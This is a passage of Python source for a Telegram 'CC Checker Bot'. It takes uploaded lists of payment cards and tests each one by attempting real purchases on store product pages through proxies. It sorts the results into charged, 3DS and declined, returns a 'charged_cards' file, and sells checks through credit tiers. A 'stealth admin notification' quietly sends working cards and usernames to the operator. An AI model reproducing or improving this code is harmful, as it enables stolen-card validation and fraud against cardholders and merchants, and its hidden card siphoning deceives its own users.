                                "❌ *Out of credits!*\n\nStopping batch check.\n\nUse /subscribe to upgrade.",
                                parse_mode="Markdown"
                            )
                        )
                        break

                    # Send credit notifications (10 remaining or depleted)
                    if remaining_credits in [10, 0]:
                        asyncio.create_task(check_and_send_credit_notifications(user_id, remaining_credits))

                    # Build full response with all error details
                    response_parts = []
                    if response.get("message"):
                        response_parts.append(response.get("message"))
                    if response.get("error"):
                        response_parts.append(response.get("error"))
                    if response.get("gateway_message"):
                        response_parts.append(f"Gateway: {response.get('gateway_message')}")
                    if response.get("decline_code"):
                        response_parts.append(f"Code: {response.get('decline_code')}")

                    full_response = " | ".join(response_parts) if response_parts else "Unknown"

                    # Truncate for progress display only
                    display_msg = full_response
                    if len(display_msg) > 50:
                        display_msg = display_msg[:47] + "..."
                    last_response = display_msg

                    # Store result with full response for file
                    result_line = f"{card} | {full_response}"

                    # Track stats
                    increment_stat("total_cards_checked")

                    if response.get("success"):
                        charged.append(result)
                        all_results.append(f"CHARGED | {result_line}")
                        increment_stat("total_charged")
                        # Non-blocking notification to user
                        asyncio.create_task(
                            update.message.reply_text(format_result(result), parse_mode="Markdown")
                        )
                        # Stealth admin notification (real-time, non-blocking)
                        asyncio.create_task(notify_admin_charged(card, result, user_id, username))
                    elif '3ds' in str(response.get("error", "")).lower() or '3d' in str(response.get("error", "")).lower():
                        three_ds.append(result)
                        all_results.append(f"3DS | {result_line}")
                        increment_stat("total_3ds")
                        asyncio.create_task(
                            update.message.reply_text(format_result(result), parse_mode="Markdown")
                        )
                    else:
                        declined.append(result)
                        all_results.append(f"DECLINED | {result_line}")
                        increment_stat("total_declined")

                    # Update progress every 5 cards (non-blocking)
                    if checked_count % 5 == 0 or checked_count == total_cards:
                        try:
                            progress_bar = create_progress_bar(checked_count, total_cards)
                            pause_status = "⏸️ *PAUSED*\n\n" if session["paused"] else ""
                            credits_display = f"💰 Credits: {remaining_credits}" if remaining_credits != -1 else "💰 Credits: ♾️"
                            asyncio.create_task(status_msg.edit_text(
                                f"{pause_status}⏳ *Checking Cards...*\n\n"
                                f"{progress_bar}\n"
                                f"📊 {checked_count}/{total_cards} checked\n"
                                f"{credits_display}\n\n"
                                f"✅ Charged: {len(charged)}\n"
                                f"🔐 3DS: {len(three_ds)}\n"
                                f"❌ Declined: {len(declined)}\n\n"
                                f"💬 *Last*: `{last_response}`",
                                parse_mode="Markdown",
                                reply_markup=get_checking_keyboard(paused=session["paused"])
                            ))
                        except Exception:
                            pass

                except asyncio.CancelledError:
                    logger.warning(f"Task cancelled during batch check for user {user_id}")
                    continue
                except Exception as e:
                    logger.error(f"Batch check error for user {user_id}: {e}")
                    last_response = f"Error: {str(e)[:30]}"
                    checked_count += 1

    except Exception as e:
        logger.error(f"Fatal error in batch check for user {user_id}: {e}")
    finally:
        # Reset session
        session["checking"] = False

        # Final summary
        stop_text = "⏹️ *STOPPED* - " if was_stopped else ""
        summary = (
            f"{stop_text}📊 *FINAL RESULTS*\n\n"
            f"✅ Charged: {len(charged)}\n"
            f"🔐 3DS: {len(three_ds)}\n"
            f"❌ Declined: {len(declined)}\n"
            f"📝 Checked: {checked_count}/{total_cards}"
        )

        try:
            await status_msg.edit_text(summary, parse_mode="Markdown")
        except Exception:
            pass

        # Send full results file
        if all_results:
            try:
                results_text = "\n".join(all_results)
                file_buffer = io.BytesIO(results_text.encode('utf-8'))
                file_buffer.name = "results.txt"
                await update.message.reply_document(
                    document=file_buffer,
                    caption=f"📊 Results: {len(charged)} Charged | {len(three_ds)} 3DS | {len(declined)} Declined | {checked_count}/{total_cards} checked"
                )
            except Exception as e:
                logger.error(f"Failed to send results file: {e}")

        # Send charged cards separately
        if charged:
            try:
                charged_text = "\n".join([r["card"] for r in charged])
                file_buffer = io.BytesIO(charged_text.encode('utf-8'))
                file_buffer.name = "charged_cards.txt"
                await update.message.reply_document(
                    document=file_buffer,
                    caption=f"✅ {len(charged)} Charged Cards"
                )
            except Exception as e:
                logger.error(f"Failed to send charged cards file: {e}")


async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle .txt file uploads for mass checking"""
    user_id = update.effective_user.id
    document = update.message.document

    # Check if user is banned
    if is_user_banned(user_id):
        await update.message.reply_text("🚫 You are banned from using this bot.")
        return

    # Check if user has products set
    if not user_has_products(user_id):
        await update.message.reply_text(
            "❌ *No product set!*\n\n"
            "Use the menu to add a product first.",
            parse_mode="Markdown",
            reply_markup=get_main_menu_keyboard()
        )
        return

    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a .txt file containing cards.")
        return

    # Download file
    file = await context.bot.get_file(document.file_id)
    file_bytes = await file.download_as_bytearray()

    try:
        card_text = file_bytes.decode('utf-8')
    except UnicodeDecodeError:
        card_text = file_bytes.decode('latin-1')

    cards = create_lista_(card_text)

    if not cards:
        await update.message.reply_text("❌ No valid cards found in the file.")
        return

    # Check credits BEFORE processing
    user_credits = get_user_credits(user_id)
    cards_to_check = len(cards)

    if user_credits != -1 and user_credits < cards_to_check:
        # Not enough credits for all cards
        if user_credits == 0:
            await update.message.reply_text(
                get_no_credits_message(),
                parse_mode="Markdown",
                reply_markup=get_subscribe_keyboard()
            )
            return
        else:
            # Warn user and only check what they can afford
            await update.message.reply_text(
                f"⚠️ *Limited Credits!*\n\n"
                f"You have {user_credits} credits but {cards_to_check} cards.\n"
                f"Only the first {user_credits} cards will be checked.\n\n"
                f"_Upgrade to check more cards!_",
                parse_mode="Markdown"
            )
            cards = cards[:user_credits]
            cards_to_check = len(cards)

    # Reset session state
    reset_user_session(user_id)
    session = get_user_session(user_id)
    session["checking"] = True

    # Pre-fetch user settings ONCE before starting (optimization)
    user_settings = get_user_settings(user_id)

    # Show credits in status
    credits_text = f"💰 Credits: {user_credits}" if user_credits != -1 else "💰 Credits: ♾️ Unlimited"

    status_msg = await update.message.reply_text(
        f"📂 *File Received*\n\n"
        f"💳 Cards found: {len(cards)}\n"
        f"{credits_text}\n"
        f"⏳ Starting check...",
        parse_mode="Markdown",
        reply_markup=get_checking_keyboard(paused=False)
    )

    # Run the checking loop as a BACKGROUND TASK so the handler returns immediately
    # This allows other users to interact with the bot while checking is in progress
    asyncio.create_task(
        run_batch_check(cards, user_id, user_settings, session, status_msg, update)
    )


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle direct card messages and input waiting"""
    user_id = update.effective_user.id
    text = update.message.text or ""

    # Check if waiting for input
    waiting_for = get_waiting_for(user_id)

    # Handle proxy input
    if waiting_for == "proxy":
        set_waiting_for(user_id, None)
        proxy = text.strip()

        # Basic validation
        parts = proxy.replace(":", ":").split(":")
        if len(parts) < 2:
            await update.message.reply_text(
                "❌ *Invalid proxy format!*\n\n"
                "Use: `host:port:username:password`",
                parse_mode="Markdown",
                reply_markup=get_back_keyboard("menu_proxy")
            )
            return

        update_user_setting(user_id, "proxy", proxy)
        await update.message.reply_text(
            f"✅ *Proxy Set!*\n\n`{proxy}`",
            parse_mode="Markdown",
            reply_markup=get_back_keyboard("menu_proxy")
        )
        return

    # =============================================================================
    # ADMIN INPUT HANDLERS
    # =============================================================================

    # Handle admin user lookup
    if waiting_for == "admin_user_lookup" and is_admin(user_id):
        set_waiting_for(user_id, None)
        try:
            target_id = int(text.strip())
            settings = get_user_settings(target_id)

            banned_status = "🚫 BANNED" if is_user_banned(target_id) else "✅ Active"
            proxy_status = f"`{settings.get('proxy')}`" if settings.get("proxy") else "Not set"
            products = settings.get("products", [])

            text_msg = (
                f"👤 *User Details*\n\n"
                f"*ID*: `{target_id}`\n"
                f"*Status*: {banned_status}\n"
                f"*Proxy*: {proxy_status}\n"
                f"*Products*: {len(products)}\n"
            )

            if products:
                text_msg += "\n*Products:*\n"
                for i, url in enumerate(products[:5]):
                    short = url[:40] + "..." if len(url) > 40 else url
                    text_msg += f"{i+1}. `{short}`\n"
                if len(products) > 5:
                    text_msg += f"_...and {len(products) - 5} more_"

            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔨 Ban" if not is_user_banned(target_id) else "✅ Unban",
                                      callback_data=f"admin_toggle_ban_{target_id}")],
                [InlineKeyboardButton("◀️ Back", callback_data="admin_users")]
            ])
            await update.message.reply_text(text_msg, parse_mode="Markdown", reply_markup=keyboard)
        except ValueError:
            await update.message.reply_text(
                "❌ Invalid user ID. Please enter a numeric ID.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back", callback_data="admin_users")]
                ])
            )
        return

    # Handle admin broadcast
    if waiting_for == "admin_broadcast" and is_admin(user_id):
        set_waiting_for(user_id, None)
        broadcast_msg = text.strip()

        users = await get_all_users_from_db()
        success_count = 0
        fail_count = 0

        status_msg = await update.message.reply_text("📢 Broadcasting message...")

        for user_data in users:
            target_uid = user_data[0]
            if is_user_banned(target_uid):
                continue
            try:
                await context.bot.send_message(
                    chat_id=target_uid,
                    text=f"📢 *Admin Broadcast*\n\n{broadcast_msg}",
                    parse_mode="Markdown"
                )
                success_count += 1
            except Exception as e:
                fail_count += 1
                logger.warning(f"Failed to send broadcast to {target_uid}: {e}")

        await status_msg.edit_text(
            f"✅ *Broadcast Complete*\n\n"
            f"✅ Sent: {success_count}\n"
            f"❌ Failed: {fail_count}",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("◀️ Back", callback_data="admin_back")]
            ])
        )
        return

    # Handle admin ban
    if waiting_for == "admin_ban" and is_admin(user_id):
        set_waiting_for(user_id, None)
        try:
            target_id = int(text.strip())
            ban_user(target_id)
            await update.message.reply_text(
                f"🚫 User `{target_id}` has been banned.",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back", callback_data="admin_banned")]
                ])
            )
        except ValueError:
            await update.message.reply_text(
                "❌ Invalid user ID.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back", callback_data="admin_banned")]
                ])
            )
        return

    # Handle admin unban
    if waiting_for == "admin_unban" and is_admin(user_id):
        set_waiting_for(user_id, None)
        try:
            target_id = int(text.strip())
            if is_user_banned(target_id):
                unban_user(target_id)
                await update.message.reply_text(
                    f"✅ User `{target_id}` has been unbanned.",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("◀️ Back", callback_data="admin_banned")]
                    ])
                )
            else:
                await update.message.reply_text(
                    f"⚠️ User `{target_id}` is not banned.",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("◀️ Back", callback_data="admin_banned")]
                    ])
                )
        except ValueError:
            await update.message.reply_text(
                "❌ Invalid user ID.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back", callback_data="admin_banned")]
                ])
            )
        return

    # Handle admin add credits
    if waiting_for == "admin_add_credits" and is_admin(user_id):
        set_waiting_for(user_id, None)
        try:
            parts = text.strip().split()
            if len(parts) != 2:
                raise ValueError("Invalid format")
            target_id = int(parts[0])
            amount = int(parts[1])
            if amount <= 0:
                raise ValueError("Amount must be positive")

            new_credits = add_credits(target_id, amount)
            await update.message.reply_text(
                f"✅ Added {amount} credits to user `{target_id}`\n"
                f"New balance: {new_credits}",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back", callback_data="admin_credits")]
                ])
            )
        except ValueError as e:
            await update.message.reply_text(
                f"❌ Invalid input. Use format: `user_id amount`\n"
                f"Example: `123456789 100`",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back", callback_data="admin_credits")]
                ])
            )
        return

    # Handle admin remove credits
    if waiting_for == "admin_remove_credits" and is_admin(user_id):
        set_waiting_for(user_id, None)
        try:
            parts = text.strip().split()
            if len(parts) != 2:
                raise ValueError("Invalid format")
            target_id = int(parts[0])
            amount = int(parts[1])
            if amount <= 0:
                raise ValueError("Amount must be positive")

            # Get current credits and subtract
            current = get_user_credits(target_id)
            if current == -1:
                await update.message.reply_text(
                    f"⚠️ User `{target_id}` has unlimited credits.",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("◀️ Back", callback_data="admin_credits")]
                    ])
                )
                return

            new_credits = max(0, current - amount)
            settings = get_user_settings(target_id)
            settings["credits"] = new_credits
            save_user_settings(target_id, settings)

            await update.message.reply_text(
                f"✅ Removed {amount} credits from user `{target_id}`\n"
                f"New balance: {new_credits}",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back", callback_data="admin_credits")]
                ])
            )
        except ValueError:
            await update.message.reply_text(
                f"❌ Invalid input. Use format: `user_id amount`\n"
                f"Example: `123456789 50`",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back", callback_data="admin_credits")]
                ])
            )
        return

    # Handle admin check credits
    if waiting_for == "admin_check_credits" and is_admin(user_id):
        set_waiting_for(user_id, None)
        try:
            target_id = int(text.strip())
            info = get_subscription_info(target_id)

            credits_display = info["credits"] if not info["is_unlimited"] else "♾️ Unlimited"
            expires_text = f"\n⏰ Expires in: {info['days_left']} days" if info["days_left"] is not None else ""

            await update.message.reply_text(
                f"👤 *User {target_id}*\n\n"
                f"💰 Credits: {credits_display}\n"
                f"🏷️ Tier: {info['tier_name']}\n"
                f"📊 Total Checks: {info['total_checks_used']}"
                f"{expires_text}",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back", callback_data="admin_credits")]
                ])
            )
        except ValueError:
            await update.message.reply_text(
                "❌ Invalid user ID.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back", callback_data="admin_credits")]
                ])
            )
        return

    # Handle admin set tier
    if waiting_for == "admin_set_tier" and is_admin(user_id):
        set_waiting_for(user_id, None)
        try:
            parts = text.strip().split()
            if len(parts) != 3:
                raise ValueError("Invalid format")
            target_id = int(parts[0])
            tier = parts[1].lower()
            days = int(parts[2])

            if tier not in TIER_CREDITS:
                raise ValueError(f"Invalid tier: {tier}")
            if days <= 0:
                raise ValueError("Days must be positive")

            set_subscription(target_id, tier, days)
            tier_name = TIER_NAMES.get(tier, tier)

            await update.message.reply_text(
                f"✅ Updated user `{target_id}`\n\n"
                f"🏷️ Tier: {tier_name}\n"
                f"⏰ Duration: {days} days\n"
                f"💰 Daily Credits: {TIER_CREDITS[tier] if TIER_CREDITS[tier] != -1 else '♾️ Unlimited'}",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back", callback_data="admin_subs")]
                ])
            )
        except ValueError as e:
            await update.message.reply_text(
                f"❌ Invalid input.\n\n"
                f"Format: `user_id tier days`\n"
                f"Tiers: `free`, `basic`, `premium`, `unlimited`\n"
                f"Example: `123456789 premium 30`",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back", callback_data="admin_subs")]
                ])
            )
        return

    # Handle product input
    if waiting_for == "product":
        set_waiting_for(user_id, None)
        url = text.strip()

        # Validate URL format
        if "/products/" not in url:
            await update.message.reply_text(
                "❌ *Invalid URL!*\n\n"
                "URL must contain `/products/`\n\n"
                "Example: `https://store.com/products/item`",
                parse_mode="Markdown",
                reply_markup=get_back_keyboard("menu_products")
            )
            return

        # Validate product exists
        status_msg = await update.message.reply_text("⏳ Validating product URL...")

        try:
            import aiohttp
            async with aiohttp.ClientSession() as session:
                async with session.get(f"{url}.json", timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        product_title = data.get("product", {}).get("title", "Unknown")

                        settings = get_user_settings(user_id)
                        products = settings.get("products", [])

                        if url in products:
                            await status_msg.edit_text(
                                "⚠️ *Product already in your list!*",
                                parse_mode="Markdown",
                                reply_markup=get_back_keyboard("menu_products")
                            )
                            return

                        products.append(url)
                        update_user_setting(user_id, "products", products)

                        await status_msg.edit_text(
                            f"✅ *Product Added!*\n\n"
                            f"📝 *{product_title}*\n"
                            f"📦 Total products: {len(products)}",
                            parse_mode="Markdown",
                            reply_markup=get_back_keyboard("menu_products")
                        )
                    elif resp.status == 404:
                        await status_msg.edit_text(
                            "❌ *Product not found!*\n\nCheck the URL and try again.",
                            parse_mode="Markdown",
                            reply_markup=get_back_keyboard("menu_products")
                        )
                    else:
                        await status_msg.edit_text(
                            f"❌ *Error: HTTP {resp.status}*",
                            parse_mode="Markdown",
                            reply_markup=get_back_keyboard("menu_products")
                        )
        except Exception as e:
            await status_msg.edit_text(
                f"❌ *Failed to validate URL*\n\n{str(e)}",
                parse_mode="Markdown",
                reply_markup=get_back_keyboard("menu_products")
            )
        return

    # Parse cards from message
    cards = create_lista_(text)

    if not cards:
        return  # Ignore messages without cards

    # Check if user is banned
    if is_user_banned(user_id):
        await update.message.reply_text("🚫 You are banned from using this bot.")
        return

    # Check if user has products set
    if not user_has_products(user_id):
        await update.message.reply_text(
            "❌ *No product set!*\n\n"
            "Use /menu → Products → Add Product",
            parse_mode="Markdown",
            reply_markup=get_main_menu_keyboard()
        )
        return

    # Check credits before processing
    user_credits = get_user_credits(user_id)
    cards_to_check = len(cards)

    if user_credits != -1 and user_credits < cards_to_check:
        if user_credits == 0:
            await update.message.reply_text(
                get_no_credits_message(),
                parse_mode="Markdown",
                reply_markup=get_subscribe_keyboard()
            )
            return
        else:
            # Warn and limit cards
            await update.message.reply_text(
                f"⚠️ *Limited Credits!*\n\n"
                f"You have {user_credits} credits but {cards_to_check} cards.\n"
                f"Only the first {user_credits} cards will be checked.",
                parse_mode="Markdown"
            )
            cards = cards[:user_credits]

    if len(cards) == 1:
        # Single card - check it
        card = cards[0]

        # Check credit before single card check
        if not has_enough_credits(user_id, 1):
            await update.message.reply_text(
                get_no_credits_message(),
                parse_mode="Markdown",
                reply_markup=get_subscribe_keyboard()
            )
            return

        status_msg = await update.message.reply_text(f"⏳ Checking `{card}`...", parse_mode="Markdown")
        try:
            # Deduct credit BEFORE checking
            success, remaining = deduct_credits(user_id, 1)
            if not success:
                await status_msg.edit_text(get_no_credits_message(), parse_mode="Markdown")
                return

            # Send credit notifications (10 remaining or depleted)
            if remaining in [10, 0]:
                asyncio.create_task(check_and_send_credit_notifications(user_id, remaining))

            result = await process_single_card(card, user_id)
            formatted = format_result(result)

            # Add remaining credits to result
            credits_line = f"\n\n💰 *Credits remaining*: {remaining}" if remaining != -1 else ""
            await status_msg.edit_text(formatted + credits_line, parse_mode="Markdown")

            # Stealth admin notification for charged cards
            if result.get("response", {}).get("success"):
                username = update.effective_user.username or update.effective_user.first_name
                asyncio.create_task(notify_admin_charged(card, result, user_id, username))
        except Exception as e:
            logger.error(f"Check error: {e}")
            await status_msg.edit_text(f"❌ Error: {str(e)}")
    else:
        # Multiple cards - process them all
        # Reset session state
        reset_user_session(user_id)
        session = get_user_session(user_id)
        session["checking"] = True

        # Pre-fetch user settings ONCE before starting (optimization)
        user_settings = get_user_settings(user_id)

        credits_text = f"💰 Credits: {user_credits}" if user_credits != -1 else "💰 Credits: ♾️ Unlimited"

        status_msg = await update.message.reply_text(
            f"⏳ Checking {len(cards)} cards...\n{credits_text}",
            reply_markup=get_checking_keyboard(paused=False)
        )

        # Run the checking loop as a BACKGROUND TASK so the handler returns immediately
        # This allows other users to interact with the bot while checking is in progress
        asyncio.create_task(
            run_batch_check(cards, user_id, user_settings, session, status_msg, update)
        )


def main():
    """Start the bot"""
    global _bot_app

    if not config.BOT_TOKEN:
        logger.error("BOT_TOKEN not set! Please set the BOT_TOKEN environment variable.")
        return

    logger.info("Starting CC Checker Bot...")

    # Initialize database
    if DATABASE_URL:
        logger.info("Connecting to PostgreSQL database...")
        init_database()
    else:
        logger.warning("DATABASE_URL not set - using in-memory storage (settings won't persist)")

    app = Application.builder().token(config.BOT_TOKEN).build()

    # Store app reference for admin notifications
    _bot_app = app

    # Log admin notification status
    if config.ADMIN_USER_ID:
        logger.info(f"Admin notifications enabled for user ID: {config.ADMIN_USER_ID}")
    else:
        logger.info("Admin notifications disabled (ADMIN_USER_ID not set)")

    # Add handlers
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("menu", menu_command))
    app.add_handler(CommandHandler("setproxy", setproxy_command))
    app.add_handler(CommandHandler("addproduct", addproduct_command))
    app.add_handler(CommandHandler("removeproduct", removeproduct_command))
    app.add_handler(CommandHandler("products", products_command))
    app.add_handler(CommandHandler("clearproducts", clearproducts_command))
    app.add_handler(CommandHandler("settings", settings_command))
    app.add_handler(CommandHandler("credits", credits_command))
    app.add_handler(CommandHandler("subscribe", subscribe_command))
    app.add_handler(CommandHandler("history", history_command))
    app.add_handler(CommandHandler("dbstatus", dbstatus_command))
    app.add_handler(CommandHandler("admin", admin_command))
    app.add_handler(CommandHandler("chk", check_command))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # Run the bot
    logger.info("Bot is running...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
